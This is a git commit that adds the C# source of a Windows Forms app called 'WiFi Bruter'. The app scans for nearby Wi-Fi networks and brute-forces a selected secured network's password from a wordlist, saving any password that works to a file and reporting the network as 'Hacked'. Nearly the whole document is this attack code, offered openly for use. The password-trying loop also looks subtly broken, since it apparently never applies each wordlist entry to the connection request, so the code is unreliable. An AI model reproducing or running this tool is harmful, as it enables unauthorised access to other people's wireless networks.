b53ccc475cc6fbe39390f748de883354088c007b
MG <20111218+MG-Token@users.noreply.github.com>
2021-09-22 18:40:30 +0330

    Add files via upload

---
+++ wifi_bruter/Main.Designer.cs
@@ -0,0 +1,189 @@
+﻿namespace wifi_bruter
+{
+    partial class Main
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.lb = new System.Windows.Forms.ListBox();
+            this.reff = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.refreshtimer = new System.Windows.Forms.Timer(this.components);
+            this.brute = new System.Windows.Forms.Button();
+            this.loadword = new System.Windows.Forms.Button();
+            this.state = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.delp = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // lb
+            // 
+            this.lb.FormattingEnabled = true;
+            this.lb.Items.AddRange(new object[] {
+            "test"});
+            this.lb.Location = new System.Drawing.Point(12, 12);
+            this.lb.Name = "lb";
+            this.lb.Size = new System.Drawing.Size(250, 342);
+            this.lb.Sorted = true;
+            this.lb.TabIndex = 0;
+            // 
+            // reff
+            // 
+            this.reff.Location = new System.Drawing.Point(268, 331);
+            this.reff.Name = "reff";
+            this.reff.Size = new System.Drawing.Size(170, 23);
+            this.reff.TabIndex = 1;
+            this.reff.Text = "Refresh";
+            this.reff.UseVisualStyleBackColor = true;
+            this.reff.Click += new System.EventHandler(this.reff_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(268, 276);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(170, 20);
+            this.textBox1.TabIndex = 2;
+            this.textBox1.Text = "5000";
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(268, 260);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(135, 13);
+            this.label1.TabIndex = 3;
+            this.label1.Text = "Auto Refresh (miliseconds):";
+            // 
+            // refreshtimer
+            // 
+            this.refreshtimer.Enabled = true;
+            this.refreshtimer.Interval = 5000;
+            this.refreshtimer.Tick += new System.EventHandler(this.refreshtimer_Tick);
+            // 
+            // brute
+            // 
+            this.brute.Location = new System.Drawing.Point(268, 12);
+            this.brute.Name = "brute";
+            this.brute.Size = new System.Drawing.Size(170, 44);
+            this.brute.TabIndex = 4;
+            this.brute.Text = "Brute";
+            this.brute.UseVisualStyleBackColor = true;
+            this.brute.Click += new System.EventHandler(this.brute_Click);
+            // 
+            // loadword
+            // 
+            this.loadword.Location = new System.Drawing.Point(268, 150);
+            this.loadword.Name = "loadword";
+            this.loadword.Size = new System.Drawing.Size(170, 35);
+            this.loadword.TabIndex = 5;
+            this.loadword.Text = "Load Wordlist";
+            this.loadword.UseVisualStyleBackColor = true;
+            this.loadword.Click += new System.EventHandler(this.loadword_Click);
+            // 
+            // state
+            // 
+            this.state.AutoSize = true;
+            this.state.Location = new System.Drawing.Point(12, 357);
+            this.state.Name = "state";
+            this.state.Size = new System.Drawing.Size(62, 13);
+            this.state.TabIndex = 6;
+            this.state.Text = "Status : idle";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(313, 188);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(79, 13);
+            this.label2.TabIndex = 7;
+            this.label2.Text = "By Metal Ghost";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.label3.Location = new System.Drawing.Point(294, 134);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(122, 13);
+            this.label3.TabIndex = 8;
+            this.label3.Text = "GitHub.com/metal-ghost";
+            this.label3.Click += new System.EventHandler(this.label3_Click);
+            // 
+            // delp
+            // 
+            this.delp.Location = new System.Drawing.Point(268, 302);
+            this.delp.Name = "delp";
+            this.delp.Size = new System.Drawing.Size(170, 23);
+            this.delp.TabIndex = 9;
+            this.delp.Text = "Delete Profile";
+            this.delp.UseVisualStyleBackColor = true;
+            this.delp.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // Main
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(450, 378);
+            this.Controls.Add(this.delp);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.state);
+            this.Controls.Add(this.loadword);
+            this.Controls.Add(this.brute);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.reff);
+            this.Controls.Add(this.lb);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.MaximizeBox = false;
+            this.Name = "Main";
+            this.Text = "WiFi Bruter";
+            this.Load += new System.EventHandler(this.Main_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ListBox lb;
+        private System.Windows.Forms.Button reff;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Timer refreshtimer;
+        private System.Windows.Forms.Button brute;
+        private System.Windows.Forms.Button loadword;
+        private System.Windows.Forms.Label state;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Button delp;
+    }
+}
+
---
+++ wifi_bruter/Main.cs
@@ -0,0 +1,293 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using SimpleWifi;
+using System.Threading.Tasks;
+using System.IO;
+namespace wifi_bruter
+{
+    public partial class Main : Form
+    {
+        public Main()
+        {
+            InitializeComponent();
+        }
+        string wordlist = "";
+        private void Main_Load(object sender, EventArgs e)
+        {
+            Wifi o = new Wifi();
+            lb.Items.Clear();
+            lb.Enabled = true;
+            foreach (var item in o.GetAccessPoints())
+            {
+                lb.Items.Add(item.Name + " (signal " + item.SignalStrength.ToString() + "%)");
+                if (item.IsConnected)
+                    lb.SelectedItem = item.Name + " (signal " + item.SignalStrength.ToString() + "%)";
+            }
+            if (lb.Items.Count < 1)
+            {
+                lb.Items.Clear();
+                lb.Items.Add("---No Wifi Available---");
+                lb.Enabled = false;
+            }
+
+        }
+        void refresh()
+        {
+            Wifi o = new Wifi();
+            lb.Items.Clear();
+            lb.Enabled = true;
+
+
+            foreach (var item in o.GetAccessPoints())
+            {
+                lb.Items.Add(item.Name + " (signal " + item.SignalStrength.ToString() + "%)");
+            }
+            if (lb.Items.Count < 1)
+            {
+                lb.Items.Clear();
+                lb.Items.Add("---No Wifi Available---");
+                lb.Enabled = false;
+            }
+
+        }
+
+        private void reff_Click(object sender, EventArgs e)
+        {
+            refresh();
+        }
+
+        private void refreshtimer_Tick(object sender, EventArgs e)
+        {
+            refresh();
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+            try
+            {
+                int o = int.Parse(textBox1.Text);
+                if (o < 1000)
+                {
+                    textBox1.Text = "1000";
+                    refreshtimer.Interval = 1000;
+
+                }
+                else
+                    refreshtimer.Interval = o;
+            }
+            catch
+            {
+
+
+            }
+        }
+
+        private void loadword_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog op = new OpenFileDialog();
+            op.Filter = "*.txt|*.txt|*.*|*.*";
+            if (op.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+            {
+                wordlist = op.FileName;
+            }
+        }
+        bool cancel = false;
+        string status = "Status : ";
+        private async void brute_Click(object sender, EventArgs e)
+        {
+
+            if (brute.Text == "Brute")
+            {
+
+                //refresh();
+                lockitem();
+                brute.Text = "Cancel";
+                cancel = false;
+                Wifi o = new Wifi();
+
+                AccessPoint wb = null;
+                foreach (var item in o.GetAccessPoints())
+                {
+                    if (item.IsConnected)
+                        if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
+                        {
+                            MessageBox.Show("you can not attack the wifi when you are connected to this...", item.Name);
+                            cancel = true;
+                            unlockitem();
+                            brute.Text = "Brute";
+                            return;
+                        }
+                    if (item.HasProfile)
+                        if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
+                        {
+                            MessageBox.Show("you can not attack the wifi when wifi information has saved on your PC\nPlease Delete this wifi information and try again!", item.Name);
+                            cancel = true;
+                            unlockitem();
+                            brute.Text = "Brute";
+                            return;
+                        }
+
+                    if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
+                        wb = item;
+
+                }
+                if (wb == null)
+                {
+                    cancel = true;
+                    unlockitem();
+                    brute.Text = "Brute";
+                    return;
+
+                }
+                o.Disconnect();
+                AuthRequest b = new AuthRequest(wb);
+                if (wordlist == "")
+                {
+                    MessageBox.Show("Please Select A Wordlist!");
+                    cancel = true;
+                    unlockitem();
+                    brute.Text = "Brute";
+                    return;
+                }
+                if (!File.Exists(wordlist))
+                {
+                    MessageBox.Show("Please Select A Vaild Wordlist!");
+                    cancel = true;
+                    unlockitem();
+                    brute.Text = "Brute";
+                    return;
+                }
+
+
+                string pp = "";
+
+                if (wb.IsSecure)
+                {
+                    var count = File.ReadLines(wordlist).Count();
+                    double counter=0;
+                    using (var f = File.OpenText(wordlist))
+                    {
+                        
+                        while ((pp = f.ReadLine()) != null)
+                        {
+                            if (cancel)
+                                return;
+                            counter++;
+                            state.Text = status + "Trying " + pp + " ("+counter.ToString()+"/"+count.ToString()+") ...";
+
+
+
+                            await Task.Run(() =>
+                            {
+                                if (wb.Connect(b, true))
+                                {
+                                    cancel = true;
+                                    unlockitem();
+                                    brute.Text = "Brute";
+                                    File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + wb.Name + ".txt", @"[WiFi Bruter]
+Name (SSID)=" + wb.Name + @"
+Password=" + pp + @"
+//Cracked By Wifi Bruter
+//github.com/metal-ghost
+//Coded By Metal Ghost");
+                                    MessageBox.Show("Wifi Cracked information saved on:\n" + AppDomain.CurrentDomain.BaseDirectory + wb.Name + ".txt", wb.Name+" Hacked");
+
+                                }
+                            });
+
+
+
+
+
+                        }
+                        if (!cancel)
+                        {
+                            MessageBox.Show("Wifi not Cracked", wb.Name+" not Hacked");
+
+                            cancel = true;
+                            unlockitem();
+                            brute.Text = "Brute";
+                        }
+                    }
+                }
+                else
+                {
+                    await Task.Run(() =>
+                                {
+                                    state.Text = status + "Connecting...";
+                                    if (wb.Connect(b))
+                                        state.Text = status + "Connected to " + wb.Name;
+                                    else
+                                        state.Text = status + "Can not connect to " + wb.Name;
+                                    cancel = true;
+                                    unlockitem();
+                                    brute.Text = "Brute";
+                                });
+                }
+
+            }
+            else
+            {
+                cancel = true;
+                unlockitem();
+                brute.Text = "Brute";
+
+            }
+        }
+        void lockitem()
+        {
+            refreshtimer.Enabled = false;
+            reff.Enabled = false;
+            lb.Enabled = false;
+            textBox1.ReadOnly = true;
+            loadword.Enabled = false;
+            delp.Enabled = false;
+        }
+        void unlockitem()
+        {
+            refreshtimer.Enabled = true;
+            reff.Enabled = true;
+            lb.Enabled = true;
+            textBox1.ReadOnly = false;
+            loadword.Enabled = true;
+            state.Text = status + "idle";
+            delp.Enabled = true;
+            refresh();
+
+        }
+
+        private void label3_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://github.com/metal-ghost");
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Wifi o = new Wifi();
+
+            AccessPoint wb = null;
+            foreach (var item in o.GetAccessPoints())
+            {
+                if (item.IsConnected)
+                    if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
+                    {
+                        o.Disconnect();
+                    }
+                if (item.HasProfile)
+                    if (lb.GetItemText(lb.SelectedItem).IndexOf(item.Name) > -1)
+                    {
+                        item.DeleteProfile();
+                        MessageBox.Show("Profile Deleted");
+                    }
+
+
+            }
+        }
+    }
+}
